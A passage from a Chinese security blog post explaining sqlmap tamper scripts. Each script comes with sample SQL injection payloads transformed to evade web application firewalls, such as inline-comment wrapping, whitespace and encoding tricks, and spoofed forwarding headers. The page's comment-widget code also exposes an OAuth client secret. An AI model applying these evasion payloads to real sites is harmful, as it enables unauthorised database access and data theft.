<h4 id="在关键词前加内联注释-halfversionedmorekeywords-py"><a href="#在关键词前加内联注释-halfversionedmorekeywords-py" class="headerlink" title="在关键词前加内联注释 halfversionedmorekeywords.py"></a>在关键词前加内联注释 halfversionedmorekeywords.py</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">value' UNION ALL <span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="built_in">CHAR</span>(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">CURRENT_USER</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="built_in">CHAR</span>(<span class="number">32</span>)),<span class="built_in">CHAR</span>(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), <span class="literal">NULL</span>, <span class="literal">NULL</span># <span class="keyword">AND</span> <span class="string">'QDWa'</span>=<span class="string">'QDWa</span></div><div class="line">==&gt;</div><div class="line">value'<span class="comment">/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa</span></div></pre></td></tr></table></figure>
<p>适用数据库：MySQL &lt; 5.1 ,之后的内联注释必须为<code>/*!content*/</code></p>
<h4 id="html实体转义-htmlencode-py"><a href="#html实体转义-htmlencode-py" class="headerlink" title="html实体转义 htmlencode.py"></a>html实体转义 htmlencode.py</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>' AND SLEEP(<span class="number">5</span>)#</div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>&amp;#<span class="number">39</span>;&amp;#<span class="number">32</span>;AND&amp;#<span class="number">32</span>;SLEEP&amp;#<span class="number">40</span>;<span class="number">5</span>&amp;#<span class="number">41</span>;&amp;#<span class="number">35</span>;</div></pre></td></tr></table></figure>
<h5 id="ifnull函数替换-ifnull2casewhenisnull-py"><a href="#ifnull函数替换-ifnull2casewhenisnull-py" class="headerlink" title="ifnull函数替换 ifnull2casewhenisnull.py"></a>ifnull函数替换 ifnull2casewhenisnull.py</h5><p>将 <code>ifnull()</code> 函数转为 <code>if(isnull())</code> 函数，用于过滤了 <code>ifnull</code> 函数的情况<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IFNULL(<span class="number">1</span>, <span class="number">2</span>)</div><div class="line">==&gt;</div><div class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> ISNULL(<span class="number">1</span>) <span class="keyword">THEN</span> (<span class="number">2</span>) <span class="keyword">ELSE</span> (<span class="number">1</span>) <span class="keyword">END</span></div></pre></td></tr></table></figure></p>
<h4 id="ifnull函数替换-ifnull2ifisnull-py"><a href="#ifnull函数替换-ifnull2ifisnull-py" class="headerlink" title="ifnull函数替换 ifnull2ifisnull.py"></a>ifnull函数替换 ifnull2ifisnull.py</h4><p>将 <code>ifnull()</code> 函数转为 <code>if(isnull())</code> 函数，用于过滤了 <code>ifnull</code> 函数的情况</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">IFNULL</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span></span></div><div class="line">==&gt;</div><div class="line"><span class="function"><span class="title">IF</span><span class="params">(ISNULL(<span class="number">1</span>)</span></span>,<span class="number">2</span>,<span class="number">1</span>)</div></pre></td></tr></table></figure>
<p>适用数据库：<code>MySql5.0,5.5</code></p>
<h4 id="内置表过滤绕过-informationschemacomment-py"><a href="#内置表过滤绕过-informationschemacomment-py" class="headerlink" title="内置表过滤绕过 informationschemacomment.py"></a>内置表过滤绕过 informationschemacomment.py</h4><p>有些WAF过滤了<code>information_schema</code>字段，在其后面加行内注释</p>
<figure class="highlight ruleslanguage"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES</div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA<span class="comment">/**/</span>.TABLES</div></pre></td></tr></table></figure>
<h4 id="使用least替换比较符-least-py"><a href="#使用least替换比较符-least-py" class="headerlink" title="使用least替换比较符 least.py"></a>使用least替换比较符 least.py</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 AND A &gt; B</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">1 AND LEAST(A,B+1)=B+1</div></pre></td></tr></table></figure>
<h4 id="大写转小写-lowercase-py"><a href="#大写转小写-lowercase-py" class="headerlink" title="大写转小写 lowercase.py"></a>大写转小写 lowercase.py</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">insert</div></pre></td></tr></table></figure>
<h4 id="完整语句注释绕过-modsecurityversioned-py"><a href="#完整语句注释绕过-modsecurityversioned-py" class="headerlink" title="完整语句注释绕过 modsecurityversioned.py"></a>完整语句注释绕过 modsecurityversioned.py</h4><p>使用内联注释注释完整语句，绕过<code>ModSecurity WAF/IDS</code></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND <span class="number">2</span>&gt;<span class="number">1</span>--</div><div class="line">==&gt;</div><div class="line"><span class="number">1</span> <span class="comment">/*!30874AND 2&gt;1*/</span>--</div></pre></td></tr></table></figure>
<h4 id="完整语句注释绕过-modsecurityzeroversioned-py"><a href="#完整语句注释绕过-modsecurityzeroversioned-py" class="headerlink" title="完整语句注释绕过 modsecurityzeroversioned.py"></a>完整语句注释绕过 modsecurityzeroversioned.py</h4><p>同上，补了4个0</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND <span class="number">2</span>&gt;<span class="number">1</span>--</div><div class="line">==&gt;</div><div class="line"><span class="number">1</span> <span class="comment">/*!00000AND 2&gt;1*/</span>--</div></pre></td></tr></table></figure>
<h4 id="关键字周围加空格-multiplespaces-py"><a href="#关键字周围加空格-multiplespaces-py" class="headerlink" title="关键字周围加空格 multiplespaces.py"></a>关键字周围加空格 multiplespaces.py</h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> <span class="built_in">UNION</span> <span class="built_in">SELECT</span> foobar</div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>    <span class="built_in">UNION</span>     <span class="built_in">SELECT</span>   foobar</div></pre></td></tr></table></figure>
<h4 id="叠写关键字-nonrecursivereplacement-py"><a href="#叠写关键字-nonrecursivereplacement-py" class="headerlink" title="叠写关键字 nonrecursivereplacement.py"></a>叠写关键字 nonrecursivereplacement.py</h4><p>用于绕过替换策略，例如服务器做如下操作<code>replace(&quot;SELECT&quot;, &quot;&quot;)</code>，可用此方式绕过：</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 UNION SELECT 2--</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">1 UNIOUNIONN SELESELECTCT 2--</div></pre></td></tr></table></figure>
<h4 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h4><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SELECT FIELD FROM TABLE WHERE <span class="number">2</span>&gt;<span class="number">1</span></div><div class="line">==&gt;</div><div class="line">SELECT<span class="built_in">%C</span>0<span class="built_in">%AAFIELD</span><span class="built_in">%C</span>0<span class="built_in">%AAFROM</span><span class="built_in">%C</span>0<span class="built_in">%AATABLE</span><span class="built_in">%C</span>0<span class="built_in">%AAWHERE</span><span class="built_in">%C</span>0<span class="built_in">%AA</span>2<span class="built_in">%C</span>0<span class="built_in">%BE</span>1</div></pre></td></tr></table></figure>
<h4 id="用百分号加到所有字符前面-percentage-py"><a href="#用百分号加到所有字符前面-percentage-py" class="headerlink" title="用百分号加到所有字符前面 percentage.py"></a>用百分号加到所有字符前面 percentage.py</h4><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="xml">SELECT FIELD FROM TABLE</span></div><div class="line">==&gt;</div><div class="line"><span class="perl">%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><span class="xml"></span></div></pre></td></tr></table></figure>
<h4 id="加号替换为concat-plus2concat-py"><a href="#加号替换为concat-plus2concat-py" class="headerlink" title="加号替换为concat plus2concat.py"></a>加号替换为concat plus2concat.py</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> (<span class="built_in">CHAR</span>(<span class="number">113</span>)+<span class="built_in">CHAR</span>(<span class="number">114</span>)+<span class="built_in">CHAR</span>(<span class="number">115</span>)) <span class="keyword">FROM</span> DUAL</div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="built_in">CHAR</span>(<span class="number">113</span>),<span class="built_in">CHAR</span>(<span class="number">114</span>),<span class="built_in">CHAR</span>(<span class="number">115</span>)) <span class="keyword">FROM</span> DUAL</div></pre></td></tr></table></figure>
<h4 id="加号替换为fn-concat-plus2fnconcat-py"><a href="#加号替换为fn-concat-plus2fnconcat-py" class="headerlink" title="加号替换为fn concat plus2fnconcat.py"></a>加号替换为fn concat plus2fnconcat.py</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> (<span class="built_in">CHAR</span>(<span class="number">113</span>)+<span class="built_in">CHAR</span>(<span class="number">114</span>)+<span class="built_in">CHAR</span>(<span class="number">115</span>)) <span class="keyword">FROM</span> DUAL</div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span> &#123;fn <span class="keyword">CONCAT</span>(&#123;fn <span class="keyword">CONCAT</span>(<span class="built_in">CHAR</span>(<span class="number">113</span>),<span class="built_in">CHAR</span>(<span class="number">114</span>))&#125;,<span class="built_in">CHAR</span>(<span class="number">115</span>))&#125; <span class="keyword">FROM</span> DUAL</div></pre></td></tr></table></figure>
<h4 id="随机大小写-randomcase-py"><a href="#随机大小写-randomcase-py" class="headerlink" title="随机大小写 randomcase.py"></a>随机大小写 randomcase.py</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">INseRt</div></pre></td></tr></table></figure>
<h4 id="随机加注释-randomcomments-py"><a href="#随机加注释-randomcomments-py" class="headerlink" title="随机加注释 randomcomments.py"></a>随机加注释 randomcomments.py</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">I/**/N/**/SERT</div></pre></td></tr></table></figure>
<h4 id="加入任意字符串-securesphere-py"><a href="#加入任意字符串-securesphere-py" class="headerlink" title="加入任意字符串 securesphere.py"></a>加入任意字符串 securesphere.py</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND <span class="number">1</span>=<span class="number">1</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span> AND <span class="number">1</span>=<span class="number">1</span> and '<span class="number">0</span>having'='<span class="number">0</span>having'</div></pre></td></tr></table></figure>
<h4 id="添加sp-password字段-sp-password-py"><a href="#添加sp-password字段-sp-password-py" class="headerlink" title="添加sp_password字段 sp_password.py"></a>添加sp_password字段 sp_password.py</h4><p>在<code>payload</code>语句后添加<code>sp_password</code>，用于迷惑数据库日志<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span>--</div><div class="line">==&gt;</div><div class="line"><span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span>-- sp_password</div></pre></td></tr></table></figure></p>
<p>适用数据库：<code>MSSQL</code></p>
<h4 id="空格替换-space2comment-py"><a href="#空格替换-space2comment-py" class="headerlink" title="空格替换 space2comment.py"></a>空格替换 space2comment.py</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> <span class="keyword">users</span></div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">id</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span><span class="keyword">users</span></div></pre></td></tr></table></figure>
<h4 id="空格替换-space2dash-py"><a href="#空格替换-space2dash-py" class="headerlink" title="空格替换 space2dash.py"></a>空格替换 space2dash.py</h4><p>空格替换成被注释的字符串并换行</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>--nVNaVoPYeva%<span class="number">0</span>AAND--ngNvzqu%<span class="number">0</span>A9227=<span class="number">9227</span></div></pre></td></tr></table></figure>
<p>适用数据库：<code>MSSQL</code>、 <code>SQLite</code></p>
<h4 id="空格替换-space2hash-py"><a href="#空格替换-space2hash-py" class="headerlink" title="空格替换 space2hash.py"></a>空格替换 space2hash.py</h4><p>同上，注释从<code>--</code>改为<code>#</code></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>%<span class="number">23</span>nVNaVoPYeva%<span class="number">0</span>AAND%<span class="number">23</span>ngNvzqu%<span class="number">0</span>A9227=<span class="number">9227</span></div></pre></td></tr></table></figure>
<h4 id="空格替换-space2morecomment-py"><a href="#空格替换-space2morecomment-py" class="headerlink" title="空格替换 space2morecomment.py"></a>空格替换 space2morecomment.py</h4><p>将空格用 <code>/**_**/</code> 替代</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> <span class="keyword">users</span></div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span><span class="comment">/**_**/</span><span class="keyword">id</span><span class="comment">/**_**/</span><span class="keyword">FROM</span><span class="comment">/**_**/</span><span class="keyword">users</span></div></pre></td></tr></table></figure>
<h4 id="空格替换-space2morehash-py"><a href="#空格替换-space2morehash-py" class="headerlink" title="空格替换 space2morehash.py"></a>空格替换 space2morehash.py</h4><p>跟之前的差不多，用<code>#</code>+<code>随机字串</code>+<code>\n</code>代替空格</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND <span class="number">9227</span>=<span class="number">922</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>%<span class="number">23</span>ngNvzqu%<span class="number">0</span>AAND%<span class="number">23</span>nVNaVoPYeva%<span class="number">0</span>A%<span class="number">23</span>lujYFWfv%<span class="number">0</span>A9227=<span class="number">9227</span></div></pre></td></tr></table></figure>
<h4 id="空格替换-space2mssqlblank-py"><a href="#空格替换-space2mssqlblank-py" class="headerlink" title="空格替换 space2mssqlblank.py"></a>空格替换 space2mssqlblank.py</h4><p>随即用空白ASCII替换空格</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">    # ASCII table:</div><div class="line">    #   SOH     <span class="number">01</span>      start <span class="keyword">of</span> heading</div><div class="line">    #   STX     <span class="number">02</span>      start <span class="keyword">of</span> text</div><div class="line">    #   ETX     <span class="number">03</span>      end <span class="keyword">of</span> text</div><div class="line">    #   EOT     <span class="number">04</span>      end <span class="keyword">of</span> transmission</div><div class="line">    #   ENQ     <span class="number">05</span>      enquiry</div><div class="line">    #   ACK     <span class="number">06</span>      acknowledge</div><div class="line">    #   BEL     <span class="number">07</span>      bell</div><div class="line">    #   BS      <span class="number">08</span>      backspace</div><div class="line">    #   TAB     <span class="number">09</span>      horizontal tab</div><div class="line">    #   LF      <span class="number">0</span>A      new line</div><div class="line">    #   VT      <span class="number">0</span>B      vertical TAB</div><div class="line">    #   FF      <span class="number">0</span>C      new page</div><div class="line">    #   CR      <span class="number">0</span>D      carriage return</div><div class="line">    #   SO      <span class="number">0</span>E      shift out</div><div class="line">    #   SI      <span class="number">0</span>F      shift <span class="keyword">in</span></div><div class="line"></div><div class="line">blanks = (<span class="string">'%01'</span>, <span class="string">'%02'</span>, <span class="string">'%03'</span>, <span class="string">'%04'</span>, <span class="string">'%05'</span>, <span class="string">'%06'</span>, <span class="string">'%07'</span>, <span class="string">'%08'</span>, <span class="string">'%09'</span>, <span class="string">'%0B'</span>, <span class="string">'%0C'</span>, <span class="string">'%0D'</span>, <span class="string">'%0E'</span>, <span class="string">'%0F'</span>, <span class="string">'%0A'</span>)</div><div class="line">random.choice(blanks)</div></pre></td></tr></table></figure>
<h4 id="空格替换-space2plus-py"><a href="#空格替换-space2plus-py" class="headerlink" title="空格替换 space2plus.py"></a>空格替换 space2plus.py</h4><p>空格替换为<code>+</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> <span class="keyword">users</span></div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span>+<span class="keyword">id</span>+<span class="keyword">FROM</span>+<span class="keyword">users</span></div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="空格替换-space2randomblank-py"><a href="#空格替换-space2randomblank-py" class="headerlink" title="空格替换 space2randomblank.py"></a>空格替换 space2randomblank.py</h4><p>空格替换为随机空白符</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">    <span class="comment"># ASCII table:</span></div><div class="line">    <span class="comment">#   TAB     09      horizontal TAB</span></div><div class="line">    <span class="comment">#   LF      0A      new line</span></div><div class="line">    <span class="comment">#   FF      0C      new page</span></div><div class="line">    <span class="comment">#   CR      0D      carriage return</span></div><div class="line">blanks = (<span class="string">"%09"</span>, <span class="string">"%0A"</span>, <span class="string">"%0C"</span>, <span class="string">"%0D"</span>)</div><div class="line">SELECT id FROM users</div><div class="line">==&gt;</div><div class="line">SELECT%0Did%0DFROM%0Ausers</div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="逻辑操作符替换-symboliclogical-py"><a href="#逻辑操作符替换-symboliclogical-py" class="headerlink" title="逻辑操作符替换 symboliclogical.py"></a>逻辑操作符替换 symboliclogical.py</h4><p><code>and</code>和<code>or</code>替换成<code>&amp;&amp; ||</code></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> AND '<span class="number">1</span>'='<span class="number">1</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span> %<span class="number">26</span>%<span class="number">26</span> '<span class="number">1</span>'='<span class="number">1</span></div></pre></td></tr></table></figure>
<h4 id="union替换-unionalltounion-py"><a href="#union替换-unionalltounion-py" class="headerlink" title="union替换 unionalltounion.py"></a>union替换 unionalltounion.py</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby"><span class="number">1</span> UNION ALL SELECT</span></div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">-<span class="ruby"><span class="number">1</span> UNION SELECT</span></div></pre></td></tr></table></figure>
<h4 id="宽字符注入-unmagicquotes-py"><a href="#宽字符注入-unmagicquotes-py" class="headerlink" title="宽字符注入 unmagicquotes.py"></a>宽字符注入 unmagicquotes.py</h4><p><code>&#39;</code>替换为<code>%df%27</code></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>' AND <span class="number">1</span>=<span class="number">1</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>%bf%<span class="number">27</span>--</div></pre></td></tr></table></figure>
<h4 id="大写-uppercase-py"><a href="#大写-uppercase-py" class="headerlink" title="大写 uppercase.py"></a>大写 uppercase.py</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">insert</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">INSERT</div></pre></td></tr></table></figure>
<h4 id="HTTP头部注入-varnish-py"><a href="#HTTP头部注入-varnish-py" class="headerlink" title="HTTP头部注入 varnish.py"></a>HTTP头部注入 varnish.py</h4><p>添加一个 HTTP头 <code>X-originating-IP</code>来绕过 WAF</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">Examples</span>:</div><div class="line">&gt;&gt; <span class="selector-tag">X-forwarded-for</span>: <span class="selector-tag">TARGET_CACHESERVER_IP</span> (184<span class="selector-class">.189</span><span class="selector-class">.250</span><span class="selector-class">.X</span>)</div><div class="line">&gt;&gt; <span class="selector-tag">X-remote-IP</span>: <span class="selector-tag">TARGET_PROXY_IP</span> (184<span class="selector-class">.189</span><span class="selector-class">.250</span><span class="selector-class">.X</span>)</div><div class="line">&gt;&gt; <span class="selector-tag">X-originating-IP</span>: <span class="selector-tag">TARGET_LOCAL_IP</span> (127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span>)</div><div class="line">&gt;&gt; <span class="selector-tag">x-remote-addr</span>: <span class="selector-tag">TARGET_INTERNALUSER_IP</span> (192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.X</span>)</div><div class="line">&gt;&gt; <span class="selector-tag">X-remote-IP</span>: * <span class="selector-tag">or</span> %00 <span class="selector-tag">or</span> %0<span class="selector-tag">A</span></div></pre></td></tr></table></figure>
<h4 id="关键字内联注释-versionedmorekeywords-py"><a href="#关键字内联注释-versionedmorekeywords-py" class="headerlink" title="关键字内联注释 versionedmorekeywords.py"></a>关键字内联注释 versionedmorekeywords.py</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> UNION ALL SELECT NULL, NULL, CONCAT(CHAR(<span class="number">58</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">100</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">58</span>))#</div><div class="line">==&gt;</div><div class="line"><span class="number">1</span><span class="comment">/*!UNION*/</span><span class="comment">/*!ALL*/</span><span class="comment">/*!SELECT*/</span><span class="comment">/*!NULL*/</span>,<span class="comment">/*!NULL*/</span>, CONCAT(CHAR(<span class="number">58</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER()<span class="comment">/*!AS*/</span><span class="comment">/*!CHAR*/</span>),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">100</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">58</span>))#</div></pre></td></tr></table></figure>
<h4 id="HTTP头部注入-xforwardedfor-py"><a href="#HTTP头部注入-xforwardedfor-py" class="headerlink" title="HTTP头部注入 xforwardedfor.py"></a>HTTP头部注入 xforwardedfor.py</h4><p>添加一个伪造的 HTTP 头<code>X-Forwarded-For</code> 来绕过 WAF</p>
<p>本文总结于以下参考文献:  </p>
<ol>
<li><a href="http://www.anquan.us/static/drops/tips-143.html" target="_blank" rel="external">sqlmap用户手册</a></li>
<li><a href="http://www.anquan.us/static/drops/tips-401.html" target="_blank" rel="external">sqlmap用户手册[续]</a></li>
<li><a href="http://www.anquan.us/static/drops/tips-1343.html" target="_blank" rel="external">SQLMAP 实例COOKBOOK</a></li>
<li><a href="http://www.anquan.us/static/drops/tips-2113.html" target="_blank" rel="external">使用SQLMAP对网站和数据库进行SQL注入攻击</a></li>
<li><a href="http://www.anquan.us/static/drops/tools-4760.html" target="_blank" rel="external">使用sqlmap中tamper脚本绕过waf</a></li>
<li><a href="http://www.anquan.us/static/drops/tips-5254.html" target="_blank" rel="external">SQLMAP进阶使用</a></li>
<li><a href="http://www.anquan.us/static/drops/tips-7301.html" target="_blank" rel="external">SQLMAP源码分析Part1:流程篇</a></li>
<li><a href="http://www.anquan.us/static/drops/tips-8614.html" target="_blank" rel="external">SQLMap的前世今生</a></li>
<li><a href="https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ" target="_blank" rel="external">sqlmap自带的tamper你了解多少？</a></li>
<li><a href="http://www.zerokeeper.com/web-security/sqlmap-usage-summary.html" target="_blank" rel="external">sqlmap 使用总结</a></li>
</ol>

      
    </div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:</strong>
    empty_xl
  </li>
  <li class="post-copyright-link">
    <strong>Post link:</strong>
    <a href="https://blog.nyrae.icu/blog/sqlmap/" title="sqlmap 使用指南">https://blog.nyrae.icu/blog/sqlmap/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice: </strong>
    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> unless stating additionally.
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/web-security/" rel="tag"><i class="fa fa-tag"></i> web security</a>
          
            <a href="/tags/tools/" rel="tag"><i class="fa fa-tag"></i> tools</a>
          
            <a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a>
          
            <a href="/tags/sqlmap/" rel="tag"><i class="fa fa-tag"></i> sqlmap</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/blog/sqli-labs/" rel="next" title="sqli-labs writeup">
                <i class="fa fa-chevron-left"></i> sqli-labs writeup
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/blog/coding/" rel="prev" title="编码相关内容详解">
                编码相关内容详解 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
    <script>
    var gitment = new Gitment({
      // 根据文章标题设置唯一评论id
    // id: '', // optional
    owner: 'emptyxl',
    repo: 'emptyxl.github.io',
    oauth: {
      client_id: 'fa7413e3c0207a96ae03',
      client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2',
      }
    })
    gitment.render('comments')
